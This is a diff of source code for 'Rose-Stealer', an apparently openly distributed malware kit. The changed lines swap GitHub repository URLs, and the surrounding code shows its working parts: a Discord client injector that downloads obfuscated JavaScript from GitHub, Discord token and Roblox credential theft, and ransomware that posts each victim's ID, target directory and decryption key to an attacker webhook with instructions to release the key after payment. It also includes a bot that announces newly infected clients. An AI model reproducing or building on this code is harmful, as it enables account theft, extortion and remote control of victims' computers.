@@ -107,7 +107,7 @@ class Config:
 
         self.eb_color = 16711680
         self.eb_footer = "Rose-Stealer | t.me/rosegrabber"
-        self.wh_avatar = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png"
+        self.wh_avatar = "https://raw.githubusercontent.com/rose-dll/Rose-Stealer/main/resources/assets/rose.png"
         self.wh_name = "Rose-Stealer | t.me/rosegrabber"
 
     def get_roblox_stealing(self):
@@ -1054,7 +1054,7 @@ if iface:
             bssid = result.bssid
         except:
             pass
-            # For some reason this may result in an error (https://github.com/DamagingRose/Rose-Grabber/issues/167)
+            # For some reason this may result in an error (https://github.com/rose-dll/Rose-Stealer/issues/167)
             # pywifi/profile.py already initializes an SSID variable, so why this happens in unknown.
 
 lang = subprocess.check_output("wmic os get MUILanguages /format:list").decode().strip().split("\r\r\n")[0].split("=")[1] if subprocess.check_output("wmic os get MUILanguages /format:list", shell=True).decode().strip() else "No Language"
@@ -1714,7 +1714,7 @@ class InjectionX:
     def __init__(self, webhook: str) -> None:
         self.appdata = os.getenv("LOCALAPPDATA")
         self.discord_dirs = [self.appdata + "\\Discord", self.appdata + "\\DiscordCanary", self.appdata + "\\DiscordPTB", self.appdata + "\\DiscordDevelopment"]
-        self.code = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/data/obf-injection.js").text
+        self.code = requests.get("https://raw.githubusercontent.com/rose-dll/Rose-Stealer/main/resources/data/obf-injection.js").text
 
         for proc in psutil.process_iter():
             if "discord" in proc.name().lower():
@@ -1768,7 +1768,7 @@ timestamp = datetime.now().isoformat()
 
 
 def log_error(e):
-    data = {"username": "Rose Ransomware", "avatar_url": "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png", "embeds": [{"title": "Rose Ransomware Error", "url": "https://github.com/voyqge", "color": cc.get_color(), "fields": [{"name": "USER ID", "value": f"`{user_id}`", "inline": True}, {"name": "ERROR OCCURED", "value": f"`{e}`", "inline": True}], "footer": {"text": "https://github.com/voyqge"}, "timestamp": timestamp}]}
+    data = {"username": "Rose Ransomware", "avatar_url": "https://raw.githubusercontent.com/rose-dll/Rose-Stealer/main/resources/assets/rose.png", "embeds": [{"title": "Rose Ransomware Error", "url": "https://github.com/voyqge", "color": cc.get_color(), "fields": [{"name": "USER ID", "value": f"`{user_id}`", "inline": True}, {"name": "ERROR OCCURED", "value": f"`{e}`", "inline": True}], "footer": {"text": "https://github.com/voyqge"}, "timestamp": timestamp}]}
 
     try:
         requests.post(webhook_url, json=data)
@@ -1814,7 +1814,7 @@ Good luck"""
 
 
 def send_wh():
-    data = {"username": "Rose Ransomware", "avatar_url": "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png", "embeds": [{"title": "Rose Ransomware Hit", "description": "Hello. It looks like you have hit another person. As soon as they send you an email with their personal ID and you approved their payment, please send them the download link for the decryption tool and give them their key, thanks. https://github.com/DamagingRose/Rose-Grabber/tree/main/resources/utils/rosedec", "url": "https://github.com/gumbobr0t", "color": cc.get_color(), "fields": [{"name": "USER ID", "value": f"`{user_id}`", "inline": True}, {"name": "TARGET DIR", "value": f"`{target_directory}`", "inline": True}, {"name": "DECRYPTION KEY", "value": f"`{key.hex()}`", "inline": True}], "footer": {"text": "https://github.com/gumbobr0t"}, "timestamp": timestamp}]}
+    data = {"username": "Rose Ransomware", "avatar_url": "https://raw.githubusercontent.com/rose-dll/Rose-Stealer/main/resources/assets/rose.png", "embeds": [{"title": "Rose Ransomware Hit", "description": "Hello. It looks like you have hit another person. As soon as they send you an email with their personal ID and you approved their payment, please send them the download link for the [decryption tool](https://github.com/rose-dll/Rose-Stealer/tree/main/resources/utils/rosedec) and give them their key, thanks.", "url": "https://github.com/gumbobr0t", "color": cc.get_color(), "fields": [{"name": "USER ID", "value": f"`{user_id}`", "inline": True}, {"name": "TARGET DIR", "value": f"`{target_directory}`", "inline": True}, {"name": "DECRYPTION KEY", "value": f"`{key.hex()}`", "inline": True}], "footer": {"text": "https://github.com/gumbobr0t"}, "timestamp": timestamp}]}
 
     try:
         requests.post(webhook_url, json=data)
@@ -1921,7 +1921,7 @@ else:
     @bot.event
     async def on_ready():
         channel = bot.get_channel(int(channelid))
-        docs = "<https://github.com/DamagingRose/Rose-Grabber/blob/main/docs/KNIGHT.md>"
+        docs = "<https://github.com/rose-dll/Rose-Stealer/blob/main/docs/KNIGHT.md>"
         if cc.get_discord_ping():
             await channel.send(f"@here | New client online: process {clientid}, refer to [documentation]({docs}) for help")
         else:
@@ -2647,7 +2647,7 @@ class DiscordX:
         username, hashtag, email, idd, pfp, flags, nitro, phone = self.GetTokenInfo(token)
 
         if pfp is None:
-            pfp = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png"
+            pfp = "https://raw.githubusercontent.com/rose-dll/Rose-Stealer/main/resources/assets/rose.png"
         else:
             pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
